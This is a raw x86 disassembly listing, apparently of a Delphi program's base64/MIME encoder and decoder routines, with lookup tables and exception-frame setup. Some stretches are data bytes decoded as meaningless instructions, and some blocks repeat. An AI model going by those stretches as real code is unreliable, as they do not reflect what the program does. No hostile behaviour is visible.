lea eax [ ebp - 0x18 ]
call sub_404050
mov eax [ ebp - 0x4 ]
call sub_404310
mov edi eax
mov ebx 0x1
lea eax [ ebp - 0x10 ]
call sub_404050
cmp edi ebx
jl r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_40451c
lea eax [ eax + ebx - 0x1 ]
lea edx [ ebp - 0x14 ]
mov ecx 0x4
call sub_4028e0
add ebx 0x4
lea eax [ ebp - 0xa ]
push eax
lea eax [ ebp - 0x9 ]
push eax
lea ecx [ ebp - 0xb ]
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_46bd54
mov dl [ ebp - 0x12 ]
mov al [ esi + 0xaf ]
cmp dl al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bd4a
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_404074
lea eax [ ebp - 0x10 ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax [ ebp - 0x10 ]
call sub_404310
push eax
lea eax [ ebp - 0x10 ]
call j_sub_40451c
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_416890
mov dl [ ebp - 0x11 ]
cmp al dl
jne r-xdata
lea eax [ ebp - 0x20 ]
mov dl [ ebp - 0xb ]
call sub_404238
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_404318
jmp r-xdata
lea eax [ ebp - 0x28 ]
lea edx [ ebp - 0xb ]
mov ecx 0x3
call sub_404140
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x10 ]
call sub_404318
lea eax [ ebp - 0x24 ]
lea edx [ ebp - 0xb ]
mov ecx 0x2
call sub_404140
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_404318
jmp r-xdata
cmp edi ebx
jge r-xdata
sub_46bd54
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
xor edx edx
mov dl [ ebp - 0x4 ]
movzx edx [ eax + edx + 0x2f ]
shl edx 0x12
xor ebx ebx
mov bl [ ebp - 0x3 ]
movzx ebx [ eax + ebx + 0x2f ]
shl ebx 0xc
or edx ebx
xor ebx ebx
mov bl [ ebp - 0x2 ]
movzx ebx [ eax + ebx + 0x2f ]
shl ebx 0x6
or edx ebx
xor ebx ebx
mov bl [ ebp - 0x1 ]
movzx eax [ eax + ebx + 0x2f ]
or edx eax
mov [ ebp - 0x4 ] edx
mov al [ ebp - 0x2 ]
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov dl [ ebp - 0x3 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov dl [ ebp - 0x4 ]
mov [ eax ] dl
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46bdb4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46bf49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
call sub_404050
mov [ ebp - 0x11 ] 0x0
cmp ebx 0x7fffffff
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax [ ebp - 0x8 ]
call sub_41662c
sub esi eax
cmp ebx esi
jge r-xdata
mov eax ebx
mov ecx 0x3
cdq
idiv ecx
test edx edx
jle r-xdata
test esi esi
je r-xdata
mov esi ebx
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bf50
lea eax [ ebp - 0x1c ]
call sub_404050
lea eax [ ebp - 0xc ]
call sub_404050
retn
lea eax [ esi + 0x2 ]
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
mov eax [ ebp + 0x8 ]
call sub_40469c
xor edi edi
lea eax [ ebp - 0xc ]
mov edx esi
call sub_40469c
lea eax [ ebp - 0xc ]
call j_sub_40451c
mov edx eax
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_416858
mov ebx 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov dl [ eax + ebx - 0x1 ]
inc ebx
cmp esi ebx
jl r-xdata
xor eax eax
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0xc ]
mov al [ eax + ebx - 0x1 ]
inc ebx
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov eax [ ebp + 0x8 ]
call j_sub_40451c
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x34 ]
mov [ eax + edi - 0x1 ] dl
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov cl [ ecx + ebx - 0x1 ]
mov [ ebp - 0x11 ] cl
inc ebx
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
call j_sub_40451c
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x34 ]
mov [ eax + edi - 0x2 ] dl
mov cl [ ebp - 0x11 ]
push ecx
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_46bf5c
mov eax [ ebp + 0x8 ]
call j_sub_40451c
lea edx [ eax + edi ]
lea eax [ ebp - 0x18 ]
mov ecx 0x4
call sub_4028e0
add edi 0x4
cmp [ ebp - 0x10 ] 0x3
jge r-xdata
sub_46bf5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi eax
mov eax [ ebp + 0xc ]
xor ebx ebx
mov bl dl
shr ebx 0x2
and ebx 0x3f
mov edi [ esi + 0x30 ]
mov bl [ edi + ebx ]
mov [ ebp - 0x4 ] bl
and edx 0xff
shl edx 0x4
xor ebx ebx
mov bl cl
shr ebx 0x4
or edx ebx
and edx 0x3f
mov ebx [ esi + 0x30 ]
mov dl [ ebx + edx ]
mov [ ebp - 0x3 ] dl
xor edx edx
mov dl cl
shl edx 0x2
xor ecx ecx
mov cl al
shr ecx 0x6
or edx ecx
and edx 0x3f
mov ecx [ esi + 0x30 ]
mov dl [ ecx + edx ]
mov [ ebp - 0x2 ] dl
and al 0x3f
and eax 0xff
mov edx [ esi + 0x30 ]
mov al [ edx + eax ]
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46bfd8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46bffd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c004
retn
sub_46c010
pop esp
rol [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 8 + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
rol [ esi ] 0x38
add [ eax ] al
add [ eax - 0x4bffb947 ] cl
mov al 0x41
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x500041a9 ] dl
dec eax
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax ] ch
retn 0x46
sub_46c08c
mov ah 0xbd
inc esi
add [ esi ] cl
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ ecx + eax * 8 + 0x46 ] cl
add [ eax - 0x5c000000 ] dh
mov edx 0xb0b40046
inc ecx
add al dl
xor al 0x40
dec ecx
dec ebp
inc ebp
nop
movsb [ edi ] [ esi ]
rol [ esi ] 0x7
push cs
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
push esi
push edi
pop eax
pop ecx
pop edx
popad
bound esp [ ebx + 0x64 ]
push 0x6a69
imul ebp [ ebp + ebp * 2 + 0x6e ] 0x6f
jo r-xdata
dec ecx
dec ebp
inc ebp
nop
pushad
rol [ esi ] 0x7
push cs
push esp
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x500041a9 ] dl
dec eax
inc eax
dec ecx
dec ebp
inc ebp
pop esp
rol [ esi ] 0x2c
mov edx 0x40046
or ecx [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
je r-xdata
jb r-xdata
jno r-xdata
dec ecx
dec ebp
inc ebp
sbb cl al
inc esi
add [ ebx + edi * 4 ] dh
inc esi
add [ ebx ] al
add [ ebx ] cl
dec ecx
inc ebx
outsd
jb r-xdata
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add ah dl
rol [ esi ] 0xc4
mov ebx 0x540e0046
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
nop
test eax 0x48500041
dec ecx
dec ebp
inc ebp
add [ eax ] al
sbb cl al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3f ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ebx edx
add esp 0xfffffff0
call sub_4035a0
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
dec ecx
dec ebp
inc ebp
add [ eax ] al
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
stc
dec [ ebx + 0x33f08bda ]
ror [ ebx - 0x18fe173a ] cl
cli
dec [ ebp + 0x158b3046 ]
or [ edi + 0x53e80047 ] dl
jbe r-xdata
push 0x73
jne r-xdata
jle r-xdata
xchg edi eax
inc edi
add al ch
push ebx
mov eax esi
test bl bl
je r-xdata
inc esi
inc esi
xor al 0x3d
mov esi eax
js r-xdata
ja r-xdata
mov eax esi
jpe r-xdata
xor edx edx
jns r-xdata
xor [ edx ] esi
xor esi [ esi + 0x39383736 ]
call sub_41a944
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_4040a4
mov [ esi + 0x34 ] 0x3d
sub ebp [ edi ]
xor [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
sub_46c18b
inc [ eax ]
add [ eax ] al
inc ecx
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
popad
bound esp [ ebx + 0x64 ]
push 0x6a69
imul ebp [ ebp + ebp * 2 + 0x6e ] 0x6f
jo r-xdata
je r-xdata
jb r-xdata
mov ebx edx
add esp 0xfffffff0
call sub_4035a0
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
stc
dec [ ebx + 0x33f08bda ]
ror [ ebx - 0x18fe173a ] cl
cli
dec [ ebp + 0x158b3046 ]
or [ edi + 0x53e80047 ] dl
jbe r-xdata
jle r-xdata
xchg edi eax
inc edi
add al ch
push ebx
mov eax esi
test bl bl
je r-xdata
inc esi
inc esi
xor al 0x3d
mov esi eax
xor edx edx
js r-xdata
mov eax esi
call sub_41a944
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_4040a4
mov [ esi + 0x34 ] 0x3d
jpe r-xdata
xor [ edx ] esi
xor esi [ esi + 0x39383736 ]
sub ebp [ edi ]
add [ eax ] al
add [ eax ] al
sub_46c1d4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
push esi
lea edi [ esi + 0x30 ]
mov esi rw-data
mov ecx 0x1f
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x3d
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46c228
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_4040a4
mov [ esi + 0x34 ] 0x3d
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46c270
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c2a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c2a8
retn
mov eax rw-data
call sub_404050
sub_46c2cc
sbb bl al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 8 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 8 + 0x46 ] cl
add [ eax ] dh
add [ eax ] al
add [ eax - 0x4bffb948 ] ah
mov al 0x41
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x500041a9 ] dl
dec eax
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ ecx + ebp * 4 + 0x41 ] al
add ah dh
les eax [ esi ]
sbb [ ecx + ecx * 2 + 0x64 ] edx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ ebx - 0x1374aa40 ] cl
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_46c41e
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c425
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
mov dl [ edx ]
call sub_404238
mov eax [ ebp - 0x4 ]
add [ eax ] al
add [ ebx + 0x7f3de806 ] cl
stc
inc [ ebp - 0x72ce8140 ]
inc ebp
cld
je r-xdata
mov eax esi
mov ecx 0x1
mov edx 0x1
call sub_4045b0
dec ebx
jne r-xdata
push [ fs : eax ]
push eax
jb r-xdata
mov eax [ esi ]
call sub_404310
test eax eax
jle r-xdata
outsb
je r-xdata
mov [ fs : eax ] esp
mov ebx 0x2
bound ebp [ ebp - 0x75 ]
shr [ ebx + eax * 8 + 0x46 ] 0x0
pop es
sbb [ ecx + ecx * 2 + 0x64 ] edx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
jne r-xdata
test eax eax
jle r-xdata
add al ch
cmp cl 0xff
je r-xdata
call sub_404654
dec [ ebx + 0x34bafc45 ]
les eax [ esi ]
push eax
jb r-xdata
outsb
je r-xdata
mov edx r-xdata
cld
bound ebp [ ebp + 0x18 ]
retn
sub_46c3ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_46c41e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c425
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
mov dl [ edx ]
call sub_404238
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404654
test eax eax
jle r-xdata
mov eax esi
mov ecx 0x1
mov edx 0x1
call sub_4045b0
dec ebx
jne r-xdata
mov eax [ esi ]
call sub_404310
test eax eax
jle r-xdata
sub_46c438
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46c4e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_40469c
mov eax esi
call sub_404310
mov edi eax
jmp r-xdata
test edi edi
jle r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx edi
mov edx 0x1
mov eax esi
call sub_404570
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
call sub_40435c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c4ed
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404074
retn
mov al [ esi + edi - 0x1 ]
add al 0xf7
sub al 0x2
jb r-xdata
mov bl [ esi + edi - 0x1 ]
mov eax ebx
sub al 0xa
je r-xdata
sub al 0x2
je r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404238
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov ecx 0x1
call sub_4045f8
sub al 0x3
jne r-xdata
sub al 0x13
je r-xdata
dec edi
sub_46c4f4
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
call sub_404500
mov esi [ rw-data ]
xor eax eax
push ebp
push sub_46c6d3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
call sub_404050
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_46c438
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404310
test eax eax
jg r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
call sub_404318
mov eax [ ebp - 0x4 ]
call sub_404310
test eax eax
jle r-xdata
mov eax [ ebp - 0xc ]
call sub_404310
test eax eax
jle r-xdata
lea eax [ ebp - 0x10 ]
call sub_404050
mov ebx 0x2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c6da
lea eax [ ebp - 0x30 ]
mov edx 0xc
call sub_404074
retn
mov eax [ ebp - 0xc ]
call sub_404310
push eax
lea eax [ ebp - 0xc ]
call j_sub_40451c
mov edx eax
mov eax edi
pop ecx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
call sub_404310
test eax eax
jle r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404570
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_404318
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4045b0
dec ebx
jne r-xdata
push ebp
call sub_46c3ac
pop ecx
lea eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
call sub_40435c
mov eax [ ebp - 0x24 ]
call sub_408084
mov ebx eax
cmp bl 0x20
jne r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
call sub_404238
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_407bf8
mov eax [ ebp - 0x18 ]
mov ecx [ esi ]
mov edx r-xdata
call ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_404238
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0xc ]
call sub_404318
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404310
test eax eax
jle r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
call sub_404238
mov eax [ ebp - 0x28 ]
mov edx r-xdata
call sub_404654
test eax eax
jle r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_404238
push [ ebp - 0x2c ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4043d0
push ebp
call sub_46c3ac
pop ecx
jmp r-xdata
sub_46c71b
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
xor eax eax
push ebp
push sub_46c749
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c750
retn
sub_46c8cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] bl
0x46
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 + 0x46 ] dl
add [ eax ] dh
add [ eax ] al
in al dx
mov dl 0x46
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi + ebx * 8 + 0x48500045 ] ch
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ esp + esi * 4 ] bl
inc esi
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
jmp r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
leave
inc esi
add [ eax ] cl
add [ eax ] al
dec ecx
dec ebp
inc ebp
mov eax eax
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cad5
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404074
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407ddc
test al al
je r-xdata
outsb
outsw
dec ebp
dec ecx
dec ebp
inc ebp
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_46cace
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x70 ]
call sub_46f1ac
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40435c
add [ eax - 0x49 ] ch
inc esi
add ah dh
fild [ ebp ]
sub al 0xe0
inc ebp
add [ eax + 0x45 ] bl
add [ eax + 0x150046d5 ] bh
push esp
dec ecx
dec ebp
jae r-xdata
add [ ebp + ebp * 4 - 0x4f2bffbf ] ch
inc ecx
inc esi
add [ edi ] al
adc eax 0x4d644954
jae r-xdata
mov edx r-xdata
mov eax [ ebx + 0x44 ]
call sub_407ddc
test al al
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46cb14
mov ebx eax
inc esi
add [ esp + edx * 8 + 0x46 ] ch
add [ ecx ] bl
push esp
dec ecx
dec ebp
jae r-xdata
dec eax
xor al [ eax ]
test [ edx ] dh
inc eax
add [ esp + edx * 8 ] ch
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46cbdc
mov ebx eax
jmp r-xdata
mov edx r-xdata
mov eax [ ebx + 0x44 ]
call sub_407ddc
test al al
je r-xdata
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
mov ah 0x46
dec ecx
dec ebp
inc ebp
adc al 0xc9
inc esi
add [ ebx + esi * 4 + 0x50046 ] bl
adc cl [ ecx + 0x64 ]
dec ebp
jae r-xdata
xor ebx ebx
jb r-xdata
popad
inc ebx
outsd
jb r-xdata
inc eax
add [ edx + esi - 0x2bd3ffc0 ] al
dec ecx
dec ebp
inc ebp
add [ eax ] al
mov eax eax
hlt
sub_46c9a9
leave
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
leave
inc esi
add [ eax ] cl
add [ eax ] al
add [ esp + esi * 4 ] bl
inc esi
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi - 0x2bd3ffc0 ] al
inc esi
add [ esp + edx * 8 + 0x46 ] ch
add [ ecx ] bl
push esp
dec ecx
dec ebp
jae r-xdata
jmp r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cad5
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404074
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407ddc
test al al
je r-xdata
outsb
outsw
dec ebp
dec ecx
dec ebp
inc ebp
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_46cace
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x70 ]
call sub_46f1ac
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40435c
mov edx r-xdata
mov eax [ ebx + 0x44 ]
call sub_407ddc
test al al
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46cb14
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46cbdc
mov ebx eax
jmp r-xdata
mov edx r-xdata
mov eax [ ebx + 0x44 ]
call sub_407ddc
test al al
je r-xdata
xor ebx ebx
sub_46cb14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46cba6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
xor edx edx
mov eax esi
call sub_46b5dc
mov eax edi
mov edx [ rw-data ]
call sub_403420
test al al
je r-xdata
add esp 0xfffffff0
call sub_4035a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cbad
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi + 0x70 ]
call sub_46f1ac
mov edx [ ebp - 0x4 ]
lea eax [ esi + 0x80 ]
call sub_4040a4
cmp [ edi + 0x44 ] 0x0
je r-xdata
mov [ esi + 0x7c ] 0x0
mov eax [ edi + 0x44 ]
mov edx r-xdata
call sub_40445c
je r-xdata
mov [ esi + 0x7c ] 0x1
jmp r-xdata
sub_46cbad
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
